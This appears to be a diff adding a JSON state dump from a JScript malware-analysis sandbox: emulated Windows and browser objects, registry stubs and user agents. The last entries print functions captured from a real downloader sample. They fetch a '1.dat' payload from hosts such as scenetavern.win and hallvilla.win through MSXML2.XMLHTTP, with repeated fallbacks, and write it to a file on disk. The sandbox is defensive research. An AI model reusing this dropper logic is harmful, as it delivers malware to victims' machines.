+    "Scripting_Dictionary": "Scripting_Dictionary",
+    "ActiveXObject": "ActiveXObject",
+    "Shell_Application": "Shell_Application",
+    "Process": "Process",
+    "REG": {
+        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\PRODUCTID": "00330-80000-00000-AA676",
+        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\SYSTEMROOT": "c:\\WINDOWS",
+        "HKLM\\SOFTWARE\\CLASSES\\MIME\\DATABASE\\RFC1766\\1034": "en-us;@%SystemRoot%system32mlang.dll,-4386",
+        "HKLM\\SOFTWARE\\CLASSES\\MIME\\DATABASE\\RFC1766\\0409": "en-us;@%SystemRoot%system32mlang.dll,-4386",
+        "HKCR\\HTTP\\SHELL\\OPEN\\COMMAND\\": "\"C:\\Chrome\\chrome.exe\" -url \"%1\"",
+        "eee": "",
+        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\INTERNET SETTINGS\\URL HISTORY\\CACHEPREFIX": "Visited:"
+    },
+    "WScript_Shell": "WScript_Shell",
+    "Shell": "WScript_Shell",
+    "WScript_Network": "WScript_Network",
+    "VBScript_RegExp": "VBScript_RegExp",
+    "WshEnvironment": "WshEnvironment",
+    "WshShortcut": "WshShortcut",
+    "ADODB_Stream": "function () {\n    this.id = _object_id++;\n    this._name = \"ADODB_Stream[\" + this.id + \"]\";\n    util_log(\"new \" + this._name);\n\n    //_trace(\"ADOBE\");\n\n    this.open = function() {\n        util_log(this._name + \".Open()\");\n    }\n    this._type = 2;\n    this._position = 0;\n    this._size = 0;\n    this._content = '';\n    this._charset = undefined;\n    this.tostring = this.toString = () => {\n        return this._name /*JSON.stringify(this)*/\n    }\n\n    this.write = function(a) {\n        this.content = a;\n        if (typeof a === 'undefined')\n            util_log(this._name + \".Write(undefined) - Error ?\");\n        else {\n            util_log(this._name + \".Write(str) - \" + a.length + \" bytes\");\n            this.size = a.length\n        }\n    }\n    this.writetext = function(a) {\n        var encoding = 'binary'\n        if (typeof a === 'undefined')\n            util_log(this._name + \".WriteText(undefined) - Error ?\");\n        else {\n            if (this.type == 2 && typeof this.charset !== 'undefined') {\n                this.content = _iconv.encode(a, this.charset);\n                encoding = this.charset;\n            } else {\n                this.content = a;\n            }\n            util_log(this._name + \".WriteText(str) - \" + a.length + \" bytes, encoding: \" + encoding);\n            this.size = this.content.length\n        }\n    }\n    this.savetofile = function(a, b) {\n        util_log(this._name + \".SaveToFile(\" + a + \", \" + b + \")\");\n        _wscript_saved_files[a] = this.content;\n    }\n    this.saveToFile = this.savetofile;\n\n    this.loadfromfile = function(a) {\n            var encoding = 'binary';\n            //util_log(this._name + \".LoadFromFile(\" + a + \")\");\n            if (this.type == 2 && typeof this.charset !== 'undefined') {\n                //util_log(\"here\");\n                this.content = _iconv.decode(Buffer.from(_wscript_saved_files[a]), this.charset);\n                encoding = this.charset;\n            } else {\n                this.content = _wscript_saved_files[a];\n            }\n            util_log(this._name + \".LoadFromFile(\" + a + \") \" + this.content.length + \" bytes, encoding: \" + encoding);\n            this.Position = 0;\n        }\n        // adReadAll -1 Default. Reads all bytes from the stream, from the current position onwards to the EOS marker.\n        // This is the only valid StreamReadEnum value with binary streams (Type is adTypeBinary).\n        // adReadLine -2 Reads the next line from the stream (designated by the LineSeparator property).\n    this.readtext = function(a) {\n        util_log(this._name + \".ReadText(\" + a + \")\");\n        if (typeof a === \"undefined\" || a == adReadAll) {\n            return this.content;\n        } else if (a == adReadLine) {\n            throw new Error(\"FIXME: \" + this._name + \".ReadText(\" + a + \") not implemented.\");\n        } else if (a > 0) {\n            return this.content.slice(this.Position, this.Position + a);\n        } else {\n            return this.content;\n        }\n    }\n    this.read = function(a) {\n        util_log(this._name + \".Read(\" + a + \")\");\n        if (typeof a === \"undefined\" || a == adReadAll) {\n            return this.content;\n        } else if (a == adReadLine) {\n            throw new Error(\"FIXME: \" + this._name + \".Read(\" + a + \") not implemented.\");\n        } else if (a > 0) {\n            return this.content.slice(this.Position, this.Position + a);\n        } else {\n            return this.content;\n        }\n    }\n    this.close = function() {\n        util_log(this._name + \".Close()\");\n    }\n    this.copyto = function(t) {\n        util_log(this._name + \".CopyTo(\" + t + \")\");\n        t._type = this._type;\n        t._position = this._position;\n        t._size = this._size;\n        t._content = this._content;\n        t._charset = this._charset;\n    }\n    _defineSingleProperty(this, \"charset\", \"_charset\");\n    //_defineSingleProperty(this, \"readtext\", \"_content\");\n    //_defineSingleProperty(this, \"read\", \"_content\");\n    _defineSingleProperty(this, \"content\", \"_content\");\n    // adTypeBinary 1 Indicates binary data.\n    // adTypeText 2 Default. Indicates text data, which is in the character set specified by Charset.\n    _defineSingleProperty(this, \"type\", \"_type\");\n    _defineSingleProperty(this, \"position\", \"_position\");\n    _defineSingleProperty(this, \"size\", \"_size\");\n}",
+    "ADODB_Recordset": "ADODB_Recordset",
+    "Msxml2_DOMDocument_6_0": "Msxml2_DOMDocument_6_0",
+    "MSXML2_XMLHTTP": "MSXML2_XMLHTTP",
+    "Style": "Style",
+    "Node": "Node",
+    "Element": "Element",
+    "HTMLElement": "HTMLElement",
+    "HTMLIFrameElement": "HTMLIFrameElement",
+    "_browser_documents": [],
+    "location": {
+        "_name": "location",
+        "_props": {
+            "href": "http://example.com/?search",
+            "hostname": "example.com",
+            "search": "?search",
+            "host": "example.com"
+        },
+        "replace": "function (n) {\n        util_log(this._name + \".replace(\" + n + \")\");\n        this._props[\"href\"] = n;\n    }",
+        "toString": "() => { return \"location\" }"
+    },
+    "k": "vendor",
+    "screen": {
+        "availHeight": 1080,
+        "availLeft": 78,
+        "availTop": 0,
+        "availWidth": 1842,
+        "colorDepth": 24,
+        "height": 1080,
+        "orientation": {
+            "angle": 0,
+            "onchange": null,
+            "type": "landscape-primary"
+        },
+        "pixelDepth": 24,
+        "width": 1920,
+        "toString": "() => { return \"screen\" }"
+    },
+    "_setInterval_calls": [],
+    "_setTimeout_calls": [],
+    "window": {
+        "id": 5,
+        "_name": "window[5]",
+        "eval": "function eval(s) { /* [native code ] */ return _(s)}",
+        "settimeout": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+        "cleartimeout": "function () {\n        util_log(this._name + \".clearTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+        "scrollby": "function (x, y) {\n        util_log(this._name + \".scrollBy(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
+        "setinterval": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+        "clearinterval": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+        "settimeoutsync": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
+        "setintervalsync": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
+        "clearintervalsync": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
+        "navigator": {
+            "id": 5,
+            "_name": "window[5]",
+            "eval": "function eval(s) { /* [native code ] */ return _(s)}",
+            "settimeout": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+            "cleartimeout": "function () {\n        util_log(this._name + \".clearTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+            "scrollby": "function (x, y) {\n        util_log(this._name + \".scrollBy(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
+            "setinterval": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+            "clearinterval": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
+            "settimeoutsync": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
+            "setintervalsync": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
+            "clearintervalsync": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
+            "navigator": {
+                "$ref": "$[\"window\"][\"navigator\"]"
+            },
+            "_location": {
+                "$ref": "$[\"location\"]"
+            },
+            "toString": "() => { return \"window\" }",
+            "Array": "function Array() { [native code] }",
+            "Boolean": "function Boolean() { [native code] }",
+            "Date": "function Date() { [native code] }",
+            "Error": "function Error() { [native code] }",
+            "Math": {},
+            "Number": "function Number() { [native code] }",
+            "Object": "function Object() { [native code] }",
+            "RegExp": "function RegExp() { [native code] }",
+            "String": "function String() { [native code] }",
+            "Node": "Node",
+            "JSON": {
+                "decycle": "function decycle(object) {\n        'use strict';\n        \n        // Make a deep copy of an object or array, assuring that there is at most\n        // one instance of each object or array in the resulting structure. The\n        // duplicate references (which might be forming cycles) are replaced with\n        // an object of the form\n        //      {$ref: PATH}\n        // where the PATH is a JSONPath string that locates the first occurance.\n        // So,\n        //      var a = [];\n        //      a[0] = a;\n        //      return JSON.stringify(JSON.decycle(a));\n        // produces the string '[{\"$ref\":\"$\"}]'.\n        \n        // JSONPath is used to locate the unique object. $ indicates the top level of\n        // the object or array. [NUMBER] or [STRING] indicates a child member or\n        // property.\n        \n        var objects = [],   // Keep a reference to each unique object or array\n            paths = [];     // Keep the path to each unique object or array\n        \n        return (function derez(value, path) {\n            \n            // The derez recurses through the object, producing the deep copy.\n            \n            var i,          // The loop counter\n                name,       // Property name\n                nu;         // The new object or array\n            \n            // typeof null === 'object', so go on if this value is really an object but not\n            // one of the weird builtin objects.\n            \n            if (typeof value === 'object' && value !== null &&\n                    !(value instanceof Boolean) &&\n                    !(value instanceof Date) &&\n                    !(value instanceof Number) &&\n                    !(value instanceof RegExp) &&\n                    !(value instanceof String)) {\n                \n                // If the value is an object or array, look to see if we have already\n                // encountered it. If so, return a $ref/path object. This is a hard way,\n                // linear search that will get slower as the number of unique objects grows.\n                \n                for (i = 0; i < objects.length; i += 1) {\n                    if (objects[i] === value) {\n                        return { $ref: paths[i] };\n                    }\n                }\n                \n                // Otherwise, accumulate the unique value and its path.\n                \n                objects.push(value);\n                paths.push(path);\n                \n                // If it is an array, replicate the array.\n                \n                if (Object.prototype.toString.apply(value) === '[object Array]') {\n                    nu = [];\n                    for (i = 0; i < value.length; i += 1) {\n                        nu[i] = derez(value[i], path + '[' + i + ']');\n                    }\n                } else {\n                    \n                    // If it is an object, replicate the object.\n                    \n                    nu = {};\n                    for (name in value) {\n                        if (Object.prototype.hasOwnProperty.call(value, name)) {\n                            nu[name] = derez(value[name],\n                                    path + '[' + JSON.stringify(name) + ']');\n                        }\n                    }\n                }\n                return nu;\n            }\n            return value;\n        }(object, '$'));\n    }",
+                "retrocycle": "function retrocycle($) {\n        'use strict';\n        \n        // Restore an object that was reduced by decycle. Members whose values are\n        // objects of the form\n        //      {$ref: PATH}\n        // are replaced with references to the value found by the PATH. This will\n        // restore cycles. The object will be mutated.\n        \n        // The eval function is used to locate the values described by a PATH. The\n        // root object is kept in a $ variable. A regular expression is used to\n        // assure that the PATH is extremely well formed. The regexp contains nested\n        // * quantifiers. That has been known to have extremely bad performance\n        // problems on some browsers for very long strings. A PATH is expected to be\n        // reasonably short. A PATH is allowed to belong to a very restricted subset of\n        // Goessner's JSONPath.\n        \n        // So,\n        //      var s = '[{\"$ref\":\"$\"}]';\n        //      return JSON.retrocycle(JSON.parse(s));\n        // produces an array containing a single element which is the array itself.\n        \n        var px = /^\\$(?:\\[(?:\\d+|\\\"(?:[^\\\\\\\"\\u0000-\\u001f]|\\\\([\\\\\\\"\\/bfnrt]|u[0-9a-zA-Z]{4}))*\\\")\\])*$/;\n        \n        (function rez(value) {\n            \n            // The rez function walks recursively through the object looking for $ref\n            // properties. When it finds one that has a value that is a path, then it\n            // replaces the $ref object with a reference to the value that is found by\n            // the path.\n            \n            var i, item, name, path;\n            \n            if (value && typeof value === 'object') {\n                if (Object.prototype.toString.apply(value) === '[object Array]') {\n                    for (i = 0; i < value.length; i += 1) {\n                        item = value[i];\n                        if (item && typeof item === 'object') {\n                            path = item.$ref;\n                            if (typeof path === 'string' && px.test(path)) {\n                                value[i] = eval(path);\n                            } else {\n                                rez(item);\n                            }\n                        }\n                    }\n                } else {\n                    for (name in value) {\n                        if (typeof value[name] === 'object') {\n                            item = value[name];\n                            if (item) {\n                                path = item.$ref;\n                                if (typeof path === 'string' && px.test(path)) {\n                                    value[name] = eval(path);\n                                } else {\n                                    rez(item);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }($));\n        return $;\n    }"
+            },
+            "Function": "function Function() { [native code] }",
+            "Element": "Element",
+            "HTMLElement": "HTMLElement",
+            "_props": {
+                "_browser_type": "IE8 on Win10 64bit",
+                "userAgent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
+            },
+            "appVersion": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
+        },
+        "_location": {
+            "$ref": "$[\"location\"]"
+        },
+        "toString": "() => { return \"window\" }",
+        "Array": "function Array() { [native code] }",
+        "Boolean": "function Boolean() { [native code] }",
+        "Date": "function Date() { [native code] }",
+        "Error": "function Error() { [native code] }",
+        "Math": {
+            "$ref": "$[\"window\"][\"navigator\"][\"Math\"]"
+        },
+        "Number": "function Number() { [native code] }",
+        "Object": "function Object() { [native code] }",
+        "RegExp": "function RegExp() { [native code] }",
+        "String": "function String() { [native code] }",
+        "Node": "Node",
+        "JSON": {
+            "$ref": "$[\"window\"][\"navigator\"][\"JSON\"]"
+        },
+        "Function": "function Function() { [native code] }",
+        "Element": "Element",
+        "HTMLElement": "HTMLElement",
+        "_props": {
+            "$ref": "$[\"window\"][\"navigator\"][\"_props\"]"
+        },
+        "appVersion": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
+    },
+    "setTimeout": "function () { [native code] }",
+    "setInterval": "function () { [native code] }",
+    "clearInterval": "function () { [native code] }",
+    "clearTimeout": "function () { [native code] }",
+    "navigator": {
+        "$ref": "$[\"window\"]"
+    },
+    "Document": "Document",
+    "document": {
+        "id": 6,
+        "_name": "document[6]",
+        "_content": "",
+        "_elements": [
+            {
+                "_id": 7,
+                "_name": "Element[7]<html>",
+                "_innerHTML": "",
+                "_outerHTML": "",
+                "_text": "",
+                "_children": [
+                    {
+                        "_id": 11,
+                        "_name": "Element[11]<head>",
+                        "_innerHTML": "",
+                        "_outerHTML": "",
+                        "_text": "",
+                        "_children": [],
+                        "_attributes": [],
+                        "_class": "",
+                        "__vgRuntimeStyle": "",
+                        "_nodename": "head",
+                        "toString": "function () {\n        return this._name;\n    }",
+                        "appendchild": "function (e) {\n        util_log(this._name + \".appendChild(\" + e._name + \")\");\n        if (this._children.length == 0) {\n            this.firstChild = e;\n        }\n        this._children[this._children.length] = e;\n        e.parentNode = this;\n        e.parentelement = this;\n        return e;\n    }",
+                        "removechild": "function (e) {\n        util_log(this._name + \".removeChild(\" + e._name + \") - dummy\");\n        return e;\n    }",
+                        "setattribute": "function (n, v) {\n        util_log(this._name + \".setAttribute(\" + n + \", \" + v + \")\");\n        this._attributes[n] = v;\n    }",
+                        "_firstchild": "",
+                        "_parentelement": {
+                            "$ref": "$[\"document\"][\"_elements\"][0]"
+                        },
+                        "_parentnode": {
+                            "$ref": "$[\"document\"][\"_elements\"][0]"
+                        },
+                        "_style": {
+                            "_id": 12,
+                            "_name": "Style[12]",
+                            "_attributes": {
+                                "visibility": true,
+                                "left": 0,
+                                "top": 0,
+                                "position": "",
+                                "stylesheet": {
+                                    "cssText": ""
+                                }
+                            },
+                            "tostring": "() => {\n        return this._name;\n    }",
+                            "toString": "() => {\n        return this._name;\n    }"
+                        }
+                    },
+                    {
+                        "_id": 9,
+                        "_name": "Element[9]<body>",
+                        "_innerHTML": "",
+                        "_outerHTML": "",
+                        "_text": "",
+                        "_children": [],
+                        "_attributes": [],
+                        "_class": "",
+                        "__vgRuntimeStyle": "",
+                        "_nodename": "body",
+                        "toString": "function () {\n        return this._name;\n    }",
+                        "appendchild": "function (e) {\n        util_log(this._name + \".appendChild(\" + e._name + \")\");\n        if (this._children.length == 0) {\n            this.firstChild = e;\n        }\n        this._children[this._children.length] = e;\n        e.parentNode = this;\n        e.parentelement = this;\n        return e;\n    }",
+                        "removechild": "function (e) {\n        util_log(this._name + \".removeChild(\" + e._name + \") - dummy\");\n        return e;\n    }",
+                        "setattribute": "function (n, v) {\n        util_log(this._name + \".setAttribute(\" + n + \", \" + v + \")\");\n        this._attributes[n] = v;\n    }",
+                        "_firstchild": "",
+                        "_parentelement": {
+                            "$ref": "$[\"document\"][\"_elements\"][0]"
+                        },
+                        "_parentnode": {
+                            "$ref": "$[\"document\"][\"_elements\"][0]"
+                        },
+                        "_style": {
+                            "_id": 10,
+                            "_name": "Style[10]",
+                            "_attributes": {
+                                "visibility": true,
+                                "left": 0,
+                                "top": 0,
+                                "position": "",
+                                "stylesheet": {
+                                    "cssText": ""
+                                }
+                            },
+                            "tostring": "() => {\n        return this._name;\n    }",
+                            "toString": "() => {\n        return this._name;\n    }"
+                        }
+                    }
+                ],
+                "_attributes": [],
+                "_class": "",
+                "__vgRuntimeStyle": "",
+                "_nodename": "html",
+                "toString": "function () {\n        return this._name;\n    }",
+                "appendchild": "function (e) {\n        util_log(this._name + \".appendChild(\" + e._name + \")\");\n        if (this._children.length == 0) {\n            this.firstChild = e;\n        }\n        this._children[this._children.length] = e;\n        e.parentNode = this;\n        e.parentelement = this;\n        return e;\n    }",
+                "removechild": "function (e) {\n        util_log(this._name + \".removeChild(\" + e._name + \") - dummy\");\n        return e;\n    }",
+                "setattribute": "function (n, v) {\n        util_log(this._name + \".setAttribute(\" + n + \", \" + v + \")\");\n        this._attributes[n] = v;\n    }",
+                "_firstchild": {
+                    "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][0]"
+                },
+                "_parentelement": "",
+                "_parentnode": "",
+                "_style": {
+                    "_id": 8,
+                    "_name": "Style[8]",
+                    "_attributes": {
+                        "visibility": true,
+                        "left": 0,
+                        "top": 0,
+                        "position": "",
+                        "stylesheet": {
+                            "cssText": ""
+                        }
+                    },
+                    "tostring": "() => {\n        return this._name;\n    }",
+                    "toString": "() => {\n        return this._name;\n    }"
+                }
+            },
+            {
+                "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][1]"
+            },
+            {
+                "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][0]"
+            }
+        ],
+        "getelementsbytagname": "function (n) {\n        var ret = []\n        util_log(this._name + \".getElementsByTagName(\" + n + \")\");\n        for(i = 0; i < this._elements.length; i++) {\n            var e = this._elements[i];\n            if (e.elementName.toLowerCase() === n.toLowerCase()) {\n                ret[ret.length] = e;\n            }\n        }\n        util_log(this._name + \".getElementsByTagName(\" + n + \") ... \" + ret.length + \" found\");\n        return ret;\n    }",
+        "getelementsbyclassname": "function (n) {\n        var ret = []\n        util_log(this._name + \".getElementsByClassName(\" + n + \")\");\n        for(i = 0; i < this._elements.length; i++) {\n            var e = this._elements[i];\n            if (e.class.toLowerCase() === n.toLowerCase()) {\n                ret[ret.length] = e;\n            }\n        }\n        util_log(this._name + \".getElementsByClassName(\" + n + \") ... \" + ret.length + \" found\");\n        return ret;\n    }",
+        "getelementbyid": "function (n) {\n        util_log(this._name + \".getElementById(\" + n + \")\");\n        for(i = 0; i < this._elements.length; i++) {\n            var e = this._elements[i];\n            if ((\"\"+ e._id).toLowerCase() === n.toLowerCase()) {\n                util_log(this._name + \".getElementById(\" + n + \") => \" + e._name);\n                return e;\n            }\n        }\n        util_log(this._name + \".getElementById(\" + n + \") => null\");\n        return null;\n    }",
+        "createelement": "function (n) {\n        util_log(this._name + \".createElement(\" + n + \")\");\n        var e;\n        if (n.toLowerCase() === \"iframe\") {\n            e = new HTMLIFrameElement();\n        } else if (n.toLowerCase() === \"style\") {\n            e = new Style();\n        } else {\n            e = new Element(n);\n        }\n        this._elements[this._elements.length] = e;\n        return e;\n    }",
+        "createtextnode": "function (n) {\n        util_log(this._name + \".createTextNode(\" + n + \")\");\n        return new Element(n);\n    }",
+        "createstylesheet": "function (n) {\n        util_log(this._name + \".createStyleSheet(\" + n + \")\");\n        return this.createelement(\"style\");\n    }",
+        "write": "function (c) {\n        util_log(this._name + \".write(content) \" + c.length + \" bytes\");\n        util_log(\"=> '\" + c + \"'\");\n        _content = c;\n        _browser_documents[_browser_documents.length] = c;\n    }",
+        "writeln": "function (c) {\n        util_log(this._name + \".writeln(content) \" + c.length + \" bytes\");\n        util_log(\"=> '\" + c + \"'\");\n        _content = c;\n        _browser_documents[_browser_documents.length] = c;\n    }",
+        "_addElementById": "function (id, content) {\n        var e = new Element(\"div\");\n        e.id = _object_id;\n        e.innerHTML = content;\n        this._elements[this._elements.length] = e;\n    }",
+        "_addElementByClass": "function (cls, content) {\n        var e = new Element(\"div\");\n        e.class = cls;\n        e.innerHTML = content;\n        this._elements[this._elements.length] = e;\n    }",
+        "_props": {
+            "body": {
+                "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][1]"
+            },
+            "referrer": "http://example.com/",
+            "cookie": "",
+            "namespaces": {
+                "id": 13,
+                "_name": "Collection[13]",
+                "_items": [],
+                "add": "function (a) {\n        util_log(this._name + \".add(\" + a + \")\");\n        this._items[this._items.length] = a;\n    }",
+                "toString": "function () {\n        return this._name;\n    }"
+            }
+        },
+        "_location": {
+            "$ref": "$[\"location\"]"
+        },
+        "documentelement": {
+            "$ref": "$[\"document\"][\"_elements\"][0]"
+        },
+        "head": {
+            "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][0]"
+        },
+        "toString": "() => { return \"document\" }"
+    },
+    "Image": "function (w, h) {\n    Element.call(this, \"Image\");\n    util_log(\"Image(\" + w + \", \" + h + \")\");\n\n    this._width = w;\n    this._height = h;\n    _defineSingleProperty(this, \"width\", \"_width\");\n    _defineSingleProperty(this, \"height\", \"_height\");\n}",
+    "_agents": {
+        "IE11_W10": {
+            "_browser_type": "IE11 on Win10 64bit",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko",
+            "vendor": ""
+        },
+        "IE8": {
+            "$ref": "$[\"window\"][\"navigator\"][\"_props\"]"
+        },
+        "IE7": {
+            "_browser_type": "IE7 on Vista",
+            "userAgent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)"
+        },
+        "iPhone": {
+            "_browser_type": "iPhone?",
+            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/47.0.2526.70 Mobile/12B436 Safari/600.1.4 (000410)",
+            "vendor": "Apple"
+        },
+        "Firefox": {
+            "_browser_type": "Firefox on Win10 64bit",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
+            "vendor": ""
+        },
+        "Chrome": {
+            "_browser_type": "Chrome on Win10 64bit",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36",
+            "chrome": {
+                "app": {},
+                "csi": "function () {}",
+                "loadTimes": "function () {}",
+                "runtime": {},
+                "webstore": {}
+            },
+            "vendor": "Google Inc."
+        }
+    },
+    "_unescape_calls": [],
+    "_unescape_retuns": [],
+    "_orig_unescape": "_orig_unescape",
+    "unescape": "unescape",
+    "entrada_Antes_UV": "function entrada_Antes_UV(callback_Antes_deBJ) {\r\n    try {\r\n        var url = 'http://scenetavern.win/support.php?f=1.dat';\r\n        hacerPeticionGET_Antes_xba(url, function(objetoXMLHTTPResponseBody, respuestaBool) {\r\n            //Si respuestaBool = False significa que la petición ha ido bien y se llama a callback_Antes_deBJ\r\n            if (!respuestaBool) {\r\n                return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);\r\n            } else {\r\n                var url2 = 'http://hallvilla.win/support.php?f=1.dat';\r\n                hacerPeticionGET_Antes_xba(url2, function(objetoXMLHTTPResponseBody, respuestaBool) {\r\n                    if (!respuestaBool) {\r\n                        return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);\r\n                    } else {\r\n                        var url3 = 'http://hallvilla.win/support.php?f=1.dat';\r\n                        hacerPeticionGET_Antes_xba(url3, function(objetoXMLHTTPResponseBody, respuestaBool) {\r\n                            if (!respuestaBool) {\r\n                                return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);\r\n                            } else {\r\n                                var url4 = 'http://hallvilla.win/support.php?f=1.dat';\r\n                                hacerPeticionGET_Antes_xba(url4, function(objetoXMLHTTPResponseBody, respuestaBool) {\r\n                                    if (!respuestaBool) {\r\n                                        return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);\r\n                                    } else {\r\n                                        var url5 = 'http://hallvilla.win/support.php?f=1.dat';\r\n                                        hacerPeticionGET_Antes_xba(url5, function(objetoXMLHTTPResponseBody, respuestaBool) {\r\n                                            if (!respuestaBool) {\r\n                                                return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);\r\n                                            } else {\r\n                                                return callback_Antes_deBJ(null, true); //Si devuelve true es que ha ido mal.\r\n                                            }\r\n                                        });\r\n                                    }\r\n                                });\r\n                            }\r\n                        });\r\n                    }\r\n                });\r\n            }\r\n        });\r\n    } catch(error) { util_log(_sc + _inspect(error));\r\n        WScript.Echo(error);\r\n        return callback_Antes_deBJ(null, true);\r\n    }\r\n}",
+    "hacerPeticionGET_Antes_xba": "function hacerPeticionGET_Antes_xba(urlEntrante, funcionCallback) {\r\n    try {\r\n        var objetoXMLHTTP = new ActiveXObject(\"MSXML2.XMLHTTP\");\r\n        objetoXMLHTTP.open('GET', urlEntrante, false);\r\n        objetoXMLHTTP.send();\r\n        if (objetoXMLHTTP.status == 200) { //Si el resultado es correcto se llama a callback con un false.\r\n            return funcionCallback(objetoXMLHTTP.ResponseBody, false);\r\n        } else { //Si el resultado NO es correcto se llama a callback con un true.\r\n            return funcionCallback(null, true);\r\n        }\r\n    } catch(error) { util_log(_sc + _inspect(error));  //Si no se ha podido ejecutar la petición se llama a callback con un true.\r\n        return funcionCallback(null, true);\r\n    }\r\n}",
+    "creaYEscribeArchivo_Antes_KvgoaW": "function creaYEscribeArchivo_Antes_KvgoaW(objetoXMLHTTPResponseBody, callback_Antes_dispVF) {\r\n    try {\r\n        var rutaArchivo_Antes_YXai = crearArchivoEnCarpeta_Antes_qdwsFVTbp();\r\n        if (rutaArchivo_Antes_YXai) {\r\n            var error = escribirArchivo_Antes_cT(objetoXMLHTTPResponseBody, rutaArchivo_Antes_YXai);\r\n            if (!error) {\r\n                WScript.Echo('skKHvbVC');\r\n            }\r\n            return callback_Antes_dispVF(rutaArchivo_Antes_YXai, false);\r\n        } else {\r\n            return callback_Antes_dispVF(null, true);\r\n        }\r\n    } catch(error) { util_log(_sc + _inspect(error));\r\n        return callback_Antes_dispVF(null, true);\r\n    }\r\n}",
